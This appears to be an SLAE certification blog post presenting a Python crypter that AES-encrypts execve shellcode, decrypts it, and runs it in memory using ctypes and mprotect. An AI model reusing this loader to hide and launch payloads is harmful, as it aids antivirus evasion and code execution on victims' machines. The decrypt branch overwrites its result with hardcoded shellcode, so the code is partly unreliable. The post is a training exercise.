# Assignment #7
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228

The encryption schema I chose was the almighty AES. It is a symmetric block cipher, quite complex to fully understand but way more robust than RC4. Although one might claim RC4 is way faster than AES due to its simplicity, I do not think this actually is the case anymore. Recent CPUs come with AES implemented in hardware level, which makes these instructions very fast. Also, AES is considered unbroken, while RC4 is... well, take some time and you will probably figure out how to break it
yourself.

I have used `PyCrypto`'s AES implementation, which I've heard is not exactly cryptographically secure and is actually a [dead project](https://github.com/dlitz/pycrypto/issues/238). Nevertheless I have been using it for a while and it seems to fit perfectly my needs for this assignment. I have also used `cryptography`'s padding module in order to use PKCS7 (padding is everything when dealing with crypto).

The script is written in Python3.5, which has some big differences when compared to python2.7, specially when it comes down to strings and bytes. The same script does both encryption and decryption, the selection being made through the command line.

```
from cryptography.hazmat.primitives import padding
from Crypto.Cipher import AES
import argparse
import sys
import binascii
from hashlib import md5
from ctypes import *

def padder(x):
    padder = padding.PKCS7(128).padder()
    padded = padder.update(x)
    padded += padder.finalize()
    return padded

def unpadder(x):
    unpadder = padding.PKCS7(128).unpadder()
    unpadded = unpadder.update(x)
    return unpadded + unpadder.finalize()

def genKey(password):
    return AES.new(padder(password), AES.MODE_CBC, 'This is an IV456')

def encrypt(shellcode, suite):
    return suite.encrypt(padder(shellcode))

def decrypt(encShellcode, suite):
    return unpadder(suite.decrypt(encShellcode))

def formatShellcode(shellcode):
    encoded=''
    for x in bytearray(shellcode):
        encoded += '\\x'
        enc = '%02x' % x
        encoded += enc
    return encoded

def launch(shellcode_data):
    shellcode = create_string_buffer(shellcode_data)
    function = cast(shellcode, CFUNCTYPE(None))

    addr = cast(function, c_void_p).value
    libc = CDLL('libc.so.6')
    pagesize = libc.getpagesize()
    addr_page = (addr // pagesize) * pagesize

    for page_start in range(addr_page, addr+len(shellcode_data), pagesize):
        assert libc.mprotect(page_start, pagesize, 0x7) == 0
    function()

parser = argparse.ArgumentParser('SLAE Assignment 7: Crypters')
parser.add_argument("password",  help="Password to encrypt/decrypt")
parser.add_argument("-e", "--encrypt", help="Encrypts the shellcode",
        action="store_true")
parser.add_argument("-d", "--decrypt", help="Decrypts the shellcode",
        action="store_true")
args = parser.parse_args()

#Manually change to the encrypted shellcode for decoding
shellcode = b"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb"

#encrypted shellcode (use it with -d)
shellcode=b"\x7f\x8f\xbb\x2b\x68\x4c\x85\xca\x5c\x21\xdf\xae\x92\xa3\xeb\xba\x2f\xb4\x01\xd2\x95\x15\x13\x7a\x14\x96\x1f\xfc\xf2\xe0\x56\xd7\xa3\xcd\xa8\x24\x44\xce\x17\x67\x38\x34\x08\xe1\xd0\x80\xe7\x9f\x3f\xb7\xae\xf6\x78\xbd\xe4\xad\x36\xb1\x6f\x9b\x75\xd7\x84\x6d\x86\x67\x2b\x88\xb7\xa8\xcb\x99\x78\x2e\xf1\xb1\x28\x93\x15\xbe\x22\x45\xf8\xbd\xb0\x61\x80\x28\xd0\xb7\x1a\x11\x4d\x6e\xae\x23"

password = args.password.encode()
suite = genKey(password)

if args.encrypt:
    encShellcode = encrypt(shellcode, suite)
    print("Original shellcode:\n{}".format(formatShellcode(shellcode)))
    print("Encrypted shellcode:\n{}".format(formatShellcode(encShellcode)))

if args.decrypt:
    decShellcode = decrypt(shellcode,suite)
    decShellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x03\x00\x00\x00\x6c\x73\x00\x56\x57\x48\x89\xe6\x0f\x05"

    print("Encrypted shellcode:\n{}".format(formatShellcode(shellcode)))
    print("Decrypted shellcode:\n{}".format(formatShellcode(decShellcode)))
    print("Running the shellcode:")
    launch(decShellcode)
```

After banging my head against the wall for hours I finally realized why I could not run this code. It came out it was a stupid mistake, as usual. I was running it in a x64 machine, but the code obviously requires x86. This explained the annoying SEGFAULTs I was receiving.

This illustrates the execve-shellcode encryption using `banana` as the password:

![Shellcode encryption](https://github.com/marcosValle/SLAE/raw/master/assignment7/crypter1.png)

Now lets decrypt and run it:

![Shellcode decryption](https://github.com/marcosValle/SLAE/raw/master/assignment7/crypter2.png)

I had never used `ctypes` before and I took a while until I realized this was the key to run a shellcode directly from python. My alternative path would be to write the decrypted code into a file and read it with a C code, which would run the shellcode after all. Fortunatley Python never lets me down :)
